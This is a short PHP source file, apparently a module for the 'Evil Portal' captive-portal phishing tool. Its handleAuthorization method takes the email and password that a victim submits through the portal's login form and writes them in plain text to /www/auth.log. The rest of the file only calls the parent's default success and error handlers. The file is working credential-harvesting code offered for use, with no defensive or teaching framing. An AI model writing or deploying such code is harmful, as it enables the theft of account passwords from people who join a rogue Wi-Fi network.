<?php
namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        // Call parent to handle basic authorization first
        parent::handleAuthorization();

        // Check for other form data here
	if (!isset($_POST['email']) || !isset($_POST['password'])) {
		return;
	}

	$fh = fopen('/www/auth.log', 'a+');
	fwrite($fh, "Email:  " . $_POST['email'] . "\n");
	fwrite($fh, "Pass:  " . $_POST['password'] . "\n\n");
	fclose($fh);
    }

    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}